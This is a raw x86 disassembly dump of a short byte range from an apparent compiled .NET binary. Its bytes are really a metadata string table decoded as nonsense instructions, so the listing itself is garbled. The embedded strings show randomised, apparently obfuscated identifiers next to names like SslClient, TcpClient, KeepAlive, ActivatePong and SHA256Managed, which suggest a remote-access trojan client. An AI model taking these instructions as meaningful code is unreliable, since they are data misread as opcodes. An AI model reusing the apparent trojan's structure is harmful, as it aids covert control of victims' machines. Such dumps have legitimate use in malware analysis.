  408065:	00 49 65             	add    %cl,0x65(%ecx)
  408068:	59                   	pop    %ecx
  408069:	4a                   	dec    %edx
  40806a:	5a                   	pop    %edx
  40806b:	50                   	push   %eax
  40806c:	65 68 77 4f 63 53    	gs push $0x53634f77
  408072:	59                   	pop    %ecx
  408073:	57                   	push   %edi
  408074:	00 6e 50             	add    %ch,0x50(%esi)
  408077:	68 71 7a 72 4a       	push   $0x4a727a71
  40807c:	70 78                	jo     0x4080f6
  40807e:	74 4d                	je     0x4080cd
  408080:	5a                   	pop    %edx
  408081:	66 57                	push   %di
  408083:	00 45 56             	add    %al,0x56(%ebp)
  408086:	4b                   	dec    %ebx
  408087:	59                   	pop    %ecx
  408088:	6a 50                	push   $0x50
  40808a:	62 43 6e             	bound  %eax,0x6e(%ebx)
  40808d:	6b 68 58 77          	imul   $0x77,0x58(%eax),%ebp
  408091:	57                   	push   %edi
  408092:	00 4f 59             	add    %cl,0x59(%edi)
  408095:	51                   	push   %ecx
  408096:	46                   	inc    %esi
  408097:	49                   	dec    %ecx
  408098:	68 77 58 6e 4a       	push   $0x4a6e5877
  40809d:	49                   	dec    %ecx
  40809e:	44                   	inc    %esp
  40809f:	77 41                	ja     0x4080e2
  4080a1:	58                   	pop    %eax
  4080a2:	00 78 50             	add    %bh,0x50(%eax)
  4080a5:	4b                   	dec    %ebx
  4080a6:	62 64 71 52          	bound  %esp,0x52(%ecx,%esi,2)
  4080aa:	48                   	dec    %eax
  4080ab:	49                   	dec    %ecx
  4080ac:	66 45                	inc    %bp
  4080ae:	43                   	inc    %ebx
  4080af:	58                   	pop    %eax
  4080b0:	00 6b 75             	add    %ch,0x75(%ebx)
  4080b3:	78 69                	js     0x40811e
  4080b5:	52                   	push   %edx
  4080b6:	6c                   	insb   (%dx),%es:(%edi)
  4080b7:	54                   	push   %esp
  4080b8:	47                   	inc    %edi
  4080b9:	44                   	inc    %esp
  4080ba:	45                   	inc    %ebp
  4080bb:	58                   	pop    %eax
  4080bc:	00 50 6c             	add    %dl,0x6c(%eax)
  4080bf:	6b 78 70 56          	imul   $0x56,0x70(%eax),%edi
  4080c3:	7a 44                	jp     0x408109
  4080c5:	6d                   	insl   (%dx),%es:(%edi)
  4080c6:	5a                   	pop    %edx
  4080c7:	72 6d                	jb     0x408136
  4080c9:	55                   	push   %ebp
  4080ca:	4b                   	dec    %ebx
  4080cb:	58                   	pop    %eax
  4080cc:	00 6c 75 75          	add    %ch,0x75(%ebp,%esi,2)
  4080d0:	6c                   	insb   (%dx),%es:(%edi)
  4080d1:	46                   	inc    %esi
  4080d2:	52                   	push   %edx
  4080d3:	75 4a                	jne    0x40811f
  4080d5:	41                   	inc    %ecx
  4080d6:	79 52                	jns    0x40812a
  4080d8:	4c                   	dec    %esp
  4080d9:	58                   	pop    %eax
  4080da:	00 67 49             	add    %ah,0x49(%edi)
  4080dd:	57                   	push   %edi
  4080de:	52                   	push   %edx
  4080df:	53                   	push   %ebx
  4080e0:	4a                   	dec    %edx
  4080e1:	67 6a 4d             	addr16 push $0x4d
  4080e4:	4c                   	dec    %esp
  4080e5:	4f                   	dec    %edi
  4080e6:	54                   	push   %esp
  4080e7:	58                   	pop    %eax
  4080e8:	00 59 4f             	add    %bl,0x4f(%ecx)
  4080eb:	71 73                	jno    0x408160
  4080ed:	52                   	push   %edx
  4080ee:	69 4b 57 51 67 4a 53 	imul   $0x534a6751,0x57(%ebx),%ecx
  4080f5:	44                   	inc    %esp
  4080f6:	61                   	popa
  4080f7:	58                   	pop    %eax
  4080f8:	00 41 71             	add    %al,0x71(%ecx)
  4080fb:	45                   	inc    %ebp
  4080fc:	6d                   	insl   (%dx),%es:(%edi)
  4080fd:	41                   	inc    %ecx
  4080fe:	44                   	inc    %esp
  4080ff:	4c                   	dec    %esp
  408100:	71 61                	jno    0x408163
  408102:	49                   	dec    %ecx
  408103:	78 6e                	js     0x408173
  408105:	58                   	pop    %eax
  408106:	00 62 59             	add    %ah,0x59(%edx)
  408109:	70 77                	jo     0x408182
  40810b:	42                   	inc    %edx
  40810c:	66 68 68 4b          	pushw  $0x4b68
  408110:	51                   	push   %ecx
  408111:	63 74 58 00          	arpl   %esi,0x0(%eax,%ebx,2)
  408115:	77 50                	ja     0x408167
  408117:	6a 6a                	push   $0x6a
  408119:	61                   	popa
  40811a:	54                   	push   %esp
  40811b:	68 61 48 7a 58       	push   $0x587a4861
  408120:	00 64 76 53          	add    %ah,0x53(%esi,%esi,2)
  408124:	50                   	push   %eax
  408125:	51                   	push   %ecx
  408126:	7a 48                	jp     0x408170
  408128:	4d                   	dec    %ebp
  408129:	68 41 59 00 42       	push   $0x42005941
  40812e:	78 4b                	js     0x40817b
  408130:	45                   	inc    %ebp
  408131:	57                   	push   %edi
  408132:	42                   	inc    %edx
  408133:	61                   	popa
  408134:	58                   	pop    %eax
  408135:	6b 55 48 46          	imul   $0x46,0x48(%ebp),%edx
  408139:	49                   	dec    %ecx
  40813a:	4a                   	dec    %edx
  40813b:	48                   	dec    %eax
  40813c:	59                   	pop    %ecx
  40813d:	00 62 68             	add    %ah,0x68(%edx)
  408140:	49                   	dec    %ecx
  408141:	42                   	inc    %edx
  408142:	4c                   	dec    %esp
  408143:	5a                   	pop    %edx
  408144:	68 6d 45 4f 59       	push   $0x594f456d
  408149:	00 71 6b             	add    %dh,0x6b(%ecx)
  40814c:	47                   	inc    %edi
  40814d:	6a 6d                	push   $0x6d
  40814f:	4d                   	dec    %ebp
  408150:	70 67                	jo     0x4081b9
  408152:	77 50                	ja     0x4081a4
  408154:	59                   	pop    %ecx
  408155:	00 77 45             	add    %dh,0x45(%edi)
  408158:	5a                   	pop    %edx
  408159:	4e                   	dec    %esi
  40815a:	6c                   	insb   (%dx),%es:(%edi)
  40815b:	45                   	inc    %ebp
  40815c:	53                   	push   %ebx
  40815d:	4b                   	dec    %ebx
  40815e:	5a                   	pop    %edx
  40815f:	4b                   	dec    %ebx
  408160:	55                   	push   %ebp
  408161:	6a 59                	push   $0x59
  408163:	59                   	pop    %ecx
  408164:	00 58 41             	add    %bl,0x41(%eax)
  408167:	4d                   	dec    %ebp
  408168:	44                   	inc    %esp
  408169:	4a                   	dec    %edx
  40816a:	76 41                	jbe    0x4081ad
  40816c:	59                   	pop    %ecx
  40816d:	46                   	inc    %esi
  40816e:	52                   	push   %edx
  40816f:	66 64 59             	fs pop %cx
  408172:	00 50 50             	add    %dl,0x50(%eax)
  408175:	62 4f 51             	bound  %ecx,0x51(%edi)
  408178:	4b                   	dec    %ebx
  408179:	47                   	inc    %edi
  40817a:	76 52                	jbe    0x4081ce
  40817c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40817e:	48                   	dec    %eax
  40817f:	5a                   	pop    %edx
  408180:	53                   	push   %ebx
  408181:	70 59                	jo     0x4081dc
  408183:	00 42 66             	add    %al,0x66(%edx)
  408186:	41                   	inc    %ecx
  408187:	75 76                	jne    0x4081ff
  408189:	72 78                	jb     0x408203
  40818b:	45                   	inc    %ebp
  40818c:	45                   	inc    %ebp
  40818d:	62 48 5a             	bound  %ecx,0x5a(%eax)
  408190:	00 72 56             	add    %dh,0x56(%edx)
  408193:	49                   	dec    %ecx
  408194:	55                   	push   %ebp
  408195:	56                   	push   %esi
  408196:	4d                   	dec    %ebp
  408197:	50                   	push   %eax
  408198:	55                   	push   %ebp
  408199:	56                   	push   %esi
  40819a:	51                   	push   %ecx
  40819b:	75 56                	jne    0x4081f3
  40819d:	6b 4d 5a 00          	imul   $0x0,0x5a(%ebp),%ecx
  4081a1:	65 42                	gs inc %edx
  4081a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4081a4:	57                   	push   %edi
  4081a5:	67 6e                	outsb  %ds:(%si),(%dx)
  4081a7:	63 6a 56             	arpl   %ebp,0x56(%edx)
  4081aa:	75 47                	jne    0x4081f3
  4081ac:	64 5a                	fs pop %edx
  4081ae:	00 70 75             	add    %dh,0x75(%eax)
  4081b1:	7a 69                	jp     0x40821c
  4081b3:	48                   	dec    %eax
  4081b4:	55                   	push   %ebp
  4081b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4081b6:	4a                   	dec    %edx
  4081b7:	44                   	inc    %esp
  4081b8:	77 5a                	ja     0x408214
  4081ba:	00 76 61             	add    %dh,0x61(%esi)
  4081bd:	6c                   	insb   (%dx),%es:(%edi)
  4081be:	75 65                	jne    0x408225
  4081c0:	5f                   	pop    %edi
  4081c1:	5f                   	pop    %edi
  4081c2:	00 41 6b             	add    %al,0x6b(%ecx)
  4081c5:	4d                   	dec    %ebp
  4081c6:	4a                   	dec    %edx
  4081c7:	4d                   	dec    %ebp
  4081c8:	46                   	inc    %esi
  4081c9:	55                   	push   %ebp
  4081ca:	73 54                	jae    0x408220
  4081cc:	47                   	inc    %edi
  4081cd:	61                   	popa
  4081ce:	00 61 48             	add    %ah,0x48(%ecx)
  4081d1:	52                   	push   %edx
  4081d2:	69 43 65 53 6f 51 61 	imul   $0x61516f53,0x65(%ebx),%eax
  4081d9:	00 71 54             	add    %dh,0x54(%ecx)
  4081dc:	57                   	push   %edi
  4081dd:	58                   	pop    %eax
  4081de:	67 53                	addr16 push %ebx
  4081e0:	76 6d                	jbe    0x40824f
  4081e2:	53                   	push   %ebx
  4081e3:	77 73                	ja     0x408258
  4081e5:	56                   	push   %esi
  4081e6:	61                   	popa
  4081e7:	00 6f 67             	add    %ch,0x67(%edi)
  4081ea:	68 76 71 58 5a       	push   $0x5a587176
  4081ef:	6d                   	insl   (%dx),%es:(%edi)
  4081f0:	64 50                	fs push %eax
  4081f2:	61                   	popa
  4081f3:	61                   	popa
  4081f4:	00 63 65             	add    %ah,0x65(%ebx)
  4081f7:	4f                   	dec    %edi
  4081f8:	73 58                	jae    0x408252
  4081fa:	50                   	push   %eax
  4081fb:	4a                   	dec    %edx
  4081fc:	48                   	dec    %eax
  4081fd:	58                   	pop    %eax
  4081fe:	7a 77                	jp     0x408277
  408200:	61                   	popa
  408201:	00 41 66             	add    %al,0x66(%ecx)
  408204:	78 74                	js     0x40827a
  408206:	76 61                	jbe    0x408269
  408208:	51                   	push   %ecx
  408209:	4c                   	dec    %esp
  40820a:	73 64                	jae    0x408270
  40820c:	4f                   	dec    %edi
  40820d:	47                   	inc    %edi
  40820e:	62 00                	bound  %eax,(%eax)
  408210:	55                   	push   %ebp
  408211:	58                   	pop    %eax
  408212:	50                   	push   %eax
  408213:	6e                   	outsb  %ds:(%esi),(%dx)
  408214:	5a                   	pop    %edx
  408215:	43                   	inc    %ebx
  408216:	75 4f                	jne    0x408267
  408218:	75 4e                	jne    0x408268
  40821a:	51                   	push   %ecx
  40821b:	48                   	dec    %eax
  40821c:	62 00                	bound  %eax,(%eax)
  40821e:	43                   	inc    %ebx
  40821f:	78 64                	js     0x408285
  408221:	75 41                	jne    0x408264
  408223:	42                   	inc    %edx
  408224:	4e                   	dec    %esi
  408225:	6e                   	outsb  %ds:(%esi),(%dx)
  408226:	50                   	push   %eax
  408227:	6a 4c                	push   $0x4c
  408229:	73 52                	jae    0x40827d
  40822b:	62 00                	bound  %eax,(%eax)
  40822d:	56                   	push   %esi
  40822e:	70 6a                	jo     0x40829a
  408230:	52                   	push   %edx
  408231:	66 54                	push   %sp
  408233:	4a                   	dec    %edx
  408234:	69 77 65 45 61 62 00 	imul   $0x626145,0x65(%edi),%esi
  40823b:	74 4f                	je     0x40828c
  40823d:	6d                   	insl   (%dx),%es:(%edi)
  40823e:	65 54                	gs push %esp
  408240:	75 47                	jne    0x408289
  408242:	4e                   	dec    %esi
  408243:	55                   	push   %ebp
  408244:	57                   	push   %edi
  408245:	62 62 00             	bound  %esp,0x0(%edx)
  408248:	4f                   	dec    %edi
  408249:	75 43                	jne    0x40828e
  40824b:	4b                   	dec    %ebx
  40824c:	6f                   	outsl  %ds:(%esi),(%dx)
  40824d:	4c                   	dec    %esp
  40824e:	65 72 43             	gs jb  0x408294
  408251:	77 68                	ja     0x4082bb
  408253:	62 00                	bound  %eax,(%eax)
  408255:	6d                   	insl   (%dx),%es:(%edi)
  408256:	73 63                	jae    0x4082bb
  408258:	6f                   	outsl  %ds:(%esi),(%dx)
  408259:	72 6c                	jb     0x4082c7
  40825b:	69 62 00 4e 78 71 6f 	imul   $0x6f71784e,0x0(%edx),%esp
  408262:	6f                   	outsl  %ds:(%esi),(%dx)
  408263:	42                   	inc    %edx
  408264:	56                   	push   %esi
  408265:	65 47                	gs inc %edi
  408267:	53                   	push   %ebx
  408268:	6c                   	insb   (%dx),%es:(%edi)
  408269:	62 00                	bound  %eax,(%eax)
  40826b:	76 75                	jbe    0x4082e2
  40826d:	46                   	inc    %esi
  40826e:	4e                   	dec    %esi
  40826f:	7a 55                	jp     0x4082c6
  408271:	52                   	push   %edx
  408272:	4a                   	dec    %edx
  408273:	4a                   	dec    %edx
  408274:	48                   	dec    %eax
  408275:	76 6a                	jbe    0x4082e1
  408277:	45                   	inc    %ebp
  408278:	6e                   	outsb  %ds:(%esi),(%dx)
  408279:	62 00                	bound  %eax,(%eax)
  40827b:	4d                   	dec    %ebp
  40827c:	41                   	inc    %ecx
  40827d:	6a 55                	push   $0x55
  40827f:	4f                   	dec    %edi
  408280:	70 47                	jo     0x4082c9
  408282:	67 55                	addr16 push %ebp
  408284:	70 62                	jo     0x4082e8
  408286:	00 77 54             	add    %dh,0x54(%edi)
  408289:	6f                   	outsl  %ds:(%esi),(%dx)
  40828a:	59                   	pop    %ecx
  40828b:	74 6a                	je     0x4082f7
  40828d:	43                   	inc    %ebx
  40828e:	52                   	push   %edx
  40828f:	73 70                	jae    0x408301
  408291:	62 00                	bound  %eax,(%eax)
  408293:	76 57                	jbe    0x4082ec
  408295:	41                   	inc    %ecx
  408296:	6d                   	insl   (%dx),%es:(%edi)
  408297:	4c                   	dec    %esp
  408298:	4e                   	dec    %esi
  408299:	46                   	inc    %esi
  40829a:	47                   	inc    %edi
  40829b:	6d                   	insl   (%dx),%es:(%edi)
  40829c:	7a 73                	jp     0x408311
  40829e:	59                   	pop    %ecx
  40829f:	44                   	inc    %esp
  4082a0:	63 00                	arpl   %eax,(%eax)
  4082a2:	48                   	dec    %eax
  4082a3:	67 75 74             	addr16 jne 0x40831a
  4082a6:	57                   	push   %edi
  4082a7:	51                   	push   %ecx
  4082a8:	72 57                	jb     0x408301
  4082aa:	47                   	inc    %edi
  4082ab:	63 00                	arpl   %eax,(%eax)
  4082ad:	72 71                	jb     0x408320
  4082af:	72 49                	jb     0x4082fa
  4082b1:	6d                   	insl   (%dx),%es:(%edi)
  4082b2:	52                   	push   %edx
  4082b3:	72 69                	jb     0x40831e
  4082b5:	6a 69                	push   $0x69
  4082b7:	49                   	dec    %ecx
  4082b8:	63 00                	arpl   %eax,(%eax)
  4082ba:	41                   	inc    %ecx
  4082bb:	71 43                	jno    0x408300
  4082bd:	70 49                	jo     0x408308
  4082bf:	6d                   	insl   (%dx),%es:(%edi)
  4082c0:	67 4a                	addr16 dec %edx
  4082c2:	65 6c                	gs insb (%dx),%es:(%edi)
  4082c4:	4e                   	dec    %esi
  4082c5:	63 00                	arpl   %eax,(%eax)
  4082c7:	53                   	push   %ebx
  4082c8:	79 73                	jns    0x40833d
  4082ca:	74 65                	je     0x408331
  4082cc:	6d                   	insl   (%dx),%es:(%edi)
  4082cd:	2e 43                	cs inc %ebx
  4082cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4082d0:	6c                   	insb   (%dx),%es:(%edi)
  4082d1:	6c                   	insb   (%dx),%es:(%edi)
  4082d2:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4082d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4082d8:	73 2e                	jae    0x408308
  4082da:	47                   	inc    %edi
  4082db:	65 6e                	outsb  %gs:(%esi),(%dx)
  4082dd:	65 72 69             	gs jb  0x408349
  4082e0:	63 00                	arpl   %eax,(%eax)
  4082e2:	4d                   	dec    %ebp
  4082e3:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4082ea:	74 2e                	je     0x40831a
  4082ec:	56                   	push   %esi
  4082ed:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4082f4:	73 69                	jae    0x40835f
  4082f6:	63 00                	arpl   %eax,(%eax)
  4082f8:	67 65 74 5f          	addr16 gs je 0x40835b
  4082fc:	53                   	push   %ebx
  4082fd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4082ff:	64 53                	fs push %ebx
  408301:	79 6e                	jns    0x408371
  408303:	63 00                	arpl   %eax,(%eax)
  408305:	64 6c                	fs insb (%dx),%es:(%edi)
  408307:	69 42 52 65 6d 5a 49 	imul   $0x495a6d65,0x52(%edx),%eax
  40830e:	4d                   	dec    %ebp
  40830f:	70 63                	jo     0x408374
  408311:	00 79 6b             	add    %bh,0x6b(%ecx)
  408314:	49                   	dec    %ecx
  408315:	65 65 66 4b          	gs gs dec %bx
  408319:	73 72                	jae    0x40838d
  40831b:	56                   	push   %esi
  40831c:	76 63                	jbe    0x408381
  40831e:	00 67 73             	add    %ah,0x73(%edi)
  408321:	6b 74 74 6b 54       	imul   $0x54,0x6b(%esp,%esi,2),%esi
  408326:	42                   	inc    %edx
  408327:	65 48                	gs dec %eax
  408329:	41                   	inc    %ecx
  40832a:	51                   	push   %ecx
  40832b:	41                   	inc    %ecx
  40832c:	64 00 44 50 62       	add    %al,%fs:0x62(%eax,%edx,2)
  408331:	6d                   	insl   (%dx),%es:(%edi)
  408332:	55                   	push   %ebp
  408333:	66 48                	dec    %ax
  408335:	65 4b                	gs dec %ebx
  408337:	44                   	inc    %esp
  408338:	5a                   	pop    %edx
  408339:	42                   	inc    %edx
  40833a:	64 00 4b 56          	add    %cl,%fs:0x56(%ebx)
  40833e:	56                   	push   %esi
  40833f:	72 6a                	jb     0x4083ab
  408341:	74 6b                	je     0x4083ae
  408343:	4c                   	dec    %esp
  408344:	69 6c 55 49 4d 64 00 	imul   $0x4a00644d,0x49(%ebp,%edx,2),%ebp
  40834b:	4a 
  40834c:	75 54                	jne    0x4083a2
  40834e:	47                   	inc    %edi
  40834f:	4a                   	dec    %edx
  408350:	5a                   	pop    %edx
  408351:	4f                   	dec    %edi
  408352:	71 71                	jno    0x4083c5
  408354:	4e                   	dec    %esi
  408355:	64 00 49 64          	add    %cl,%fs:0x64(%ecx)
  408359:	78 6b                	js     0x4083c6
  40835b:	54                   	push   %esp
  40835c:	78 54                	js     0x4083b2
  40835e:	54                   	push   %esp
  40835f:	4e                   	dec    %esi
  408360:	52                   	push   %edx
  408361:	61                   	popa
  408362:	4f                   	dec    %edi
  408363:	64 00 49 74          	add    %cl,%fs:0x74(%ecx)
  408367:	5a                   	pop    %edx
  408368:	4d                   	dec    %ebp
  408369:	76 4d                	jbe    0x4083b8
  40836b:	54                   	push   %esp
  40836c:	61                   	popa
  40836d:	6f                   	outsl  %ds:(%esi),(%dx)
  40836e:	78 55                	js     0x4083c5
  408370:	57                   	push   %edi
  408371:	64 00 45 6e          	add    %al,%fs:0x6e(%ebp)
  408375:	64 52                	fs push %edx
  408377:	65 61                	gs popa
  408379:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  40837d:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  408384:	00 
  408385:	54                   	push   %esp
  408386:	68 72 65 61 64       	push   $0x64616572
  40838b:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  40838f:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  408393:	64 00 53 48          	add    %dl,%fs:0x48(%ebx)
  408397:	41                   	inc    %ecx
  408398:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  40839e:	61                   	popa
  40839f:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  4083a5:	74 5f                	je     0x408406
  4083a7:	43                   	inc    %ebx
  4083a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4083a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4083aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4083ab:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4083b0:	00 67 65             	add    %ah,0x65(%edi)
  4083b3:	74 5f                	je     0x408414
  4083b5:	49                   	dec    %ecx
  4083b6:	73 43                	jae    0x4083fb
  4083b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4083b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4083ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4083bb:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4083c0:	00 73 65             	add    %dh,0x65(%ebx)
  4083c3:	74 5f                	je     0x408424
  4083c5:	49                   	dec    %ecx
  4083c6:	73 43                	jae    0x40840b
  4083c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4083c9:	6e                   	outsb  %ds:(%esi),(%dx)
  4083ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4083cb:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4083d0:	00 67 65             	add    %ah,0x65(%edi)
  4083d3:	74 5f                	je     0x408434
  4083d5:	47                   	inc    %edi
  4083d6:	75 69                	jne    0x408441
  4083d8:	64 00 53 70          	add    %dl,%fs:0x70(%ebx)
  4083dc:	44                   	inc    %esp
  4083dd:	51                   	push   %ecx
  4083de:	46                   	inc    %esi
  4083df:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e0:	4b                   	dec    %ebx
  4083e1:	42                   	inc    %edx
  4083e2:	61                   	popa
  4083e3:	76 67                	jbe    0x40844c
  4083e5:	53                   	push   %ebx
  4083e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e7:	44                   	inc    %esp
  4083e8:	6a 64                	push   $0x64
  4083ea:	00 3c 53             	add    %bh,(%ebx,%edx,2)
  4083ed:	65 6e                	outsb  %gs:(%esi),(%dx)
  4083ef:	64 53                	fs push %ebx
  4083f1:	79 6e                	jns    0x408461
  4083f3:	63 3e                	arpl   %edi,(%esi)
  4083f5:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4083f9:	61                   	popa
  4083fa:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4083fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4083fe:	67 46                	addr16 inc %esi
  408400:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  408407:	73 43                	jae    0x40844c
  408409:	6f                   	outsl  %ds:(%esi),(%dx)
  40840a:	6e                   	outsb  %ds:(%esi),(%dx)
  40840b:	6e                   	outsb  %ds:(%esi),(%dx)
  40840c:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408411:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  408416:	61                   	popa
  408417:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40841a:	6e                   	outsb  %ds:(%esi),(%dx)
  40841b:	67 46                	addr16 inc %esi
  40841d:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  408424:	65 65 70 41          	gs gs jo 0x408469
  408428:	6c                   	insb   (%dx),%es:(%edi)
  408429:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  408430:	42                   	inc    %edx
  408431:	61                   	popa
  408432:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408435:	6e                   	outsb  %ds:(%esi),(%dx)
  408436:	67 46                	addr16 inc %esi
  408438:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  40843f:	65 61                	gs popa
  408441:	64 65 72 53          	fs gs jb 0x408498
  408445:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  40844c:	42                   	inc    %edx
  40844d:	61                   	popa
  40844e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408451:	6e                   	outsb  %ds:(%esi),(%dx)
  408452:	67 46                	addr16 inc %esi
  408454:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  40845b:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  408462:	42                   	inc    %edx
  408463:	61                   	popa
  408464:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408467:	6e                   	outsb  %ds:(%esi),(%dx)
  408468:	67 46                	addr16 inc %esi
  40846a:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  408471:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408475:	61                   	popa
  408476:	74 65                	je     0x4084dd
  408478:	50                   	push   %eax
  408479:	6f                   	outsl  %ds:(%esi),(%dx)
  40847a:	6e                   	outsb  %ds:(%esi),(%dx)
  40847b:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  408481:	61                   	popa
  408482:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408485:	6e                   	outsb  %ds:(%esi),(%dx)
  408486:	67 46                	addr16 inc %esi
  408488:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  40848f:	6e                   	outsb  %ds:(%esi),(%dx)
  408490:	74 65                	je     0x4084f7
  408492:	72 76                	jb     0x40850a
  408494:	61                   	popa
  408495:	6c                   	insb   (%dx),%es:(%edi)
  408496:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  40849b:	61                   	popa
  40849c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40849f:	6e                   	outsb  %ds:(%esi),(%dx)
  4084a0:	67 46                	addr16 inc %esi
  4084a2:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  4084a9:	75 66                	jne    0x408511
  4084ab:	66 65 72 3e          	data16 gs jb 0x4084ed
  4084af:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4084b3:	61                   	popa
  4084b4:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4084b8:	67 46                	addr16 inc %esi
  4084ba:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  4084c1:	66 66 73 65          	data16 data16 jae 0x40852a
  4084c5:	74 3e                	je     0x408505
  4084c7:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4084cb:	61                   	popa
  4084cc:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4084d0:	67 46                	addr16 inc %esi
  4084d2:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  4084d9:	73 6c                	jae    0x408547
  4084db:	43                   	inc    %ebx
  4084dc:	6c                   	insb   (%dx),%es:(%edi)
  4084dd:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  4084e4:	5f                   	pop    %edi
  4084e5:	42                   	inc    %edx
  4084e6:	61                   	popa
  4084e7:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4084eb:	67 46                	addr16 inc %esi
  4084ed:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  4084f4:	63 70 43             	arpl   %esi,0x43(%eax)
  4084f7:	6c                   	insb   (%dx),%es:(%edi)
  4084f8:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  4084ff:	5f                   	pop    %edi
  408500:	42                   	inc    %edx
  408501:	61                   	popa
  408502:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408505:	6e                   	outsb  %ds:(%esi),(%dx)
  408506:	67 46                	addr16 inc %esi
  408508:	69 65 6c 64 00 41 70 	imul   $0x70410064,0x6c(%ebp),%esp
  40850f:	70 65                	jo     0x408576
  408511:	6e                   	outsb  %ds:(%esi),(%dx)
  408512:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  408516:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  40851d:	61 
  40851e:	6c                   	insb   (%dx),%es:(%edi)
  40851f:	75 65                	jne    0x408586
  408521:	4b                   	dec    %ebx
  408522:	69 6e 64 00 46 56 46 	imul   $0x46564600,0x64(%esi),%ebp
  408529:	48                   	dec    %eax
  40852a:	50                   	push   %eax
  40852b:	45                   	inc    %ebp
  40852c:	54                   	push   %esp
  40852d:	53                   	push   %ebx
  40852e:	55                   	push   %ebp
  40852f:	73 62                	jae    0x408593
  408531:	78 64                	js     0x408597
  408533:	00 47 70             	add    %al,0x70(%edi)
  408536:	5a                   	pop    %edx
  408537:	74 6d                	je     0x4085a6
  408539:	61                   	popa
  40853a:	65 50                	gs push %eax
  40853c:	52                   	push   %edx
  40853d:	4f                   	dec    %edi
  40853e:	47                   	inc    %edi
  40853f:	47                   	inc    %edi
  408540:	65 00 58 6f          	add    %bl,%gs:0x6f(%eax)
  408544:	64 57                	fs push %edi
  408546:	68 51 74 48 53       	push   $0x53487451
  40854b:	65 00 4e 47          	add    %cl,%gs:0x47(%esi)
  40854f:	74 56                	je     0x4085a7
  408551:	7a 48                	jp     0x40859b
  408553:	52                   	push   %edx
  408554:	50                   	push   %eax
  408555:	55                   	push   %ebp
  408556:	65 00 4d 55          	add    %cl,%gs:0x55(%ebp)
  40855a:	61                   	popa
  40855b:	4c                   	dec    %esp
  40855c:	48                   	dec    %eax
  40855d:	61                   	popa
  40855e:	5a                   	pop    %edx
  40855f:	6a 59                	push   $0x59
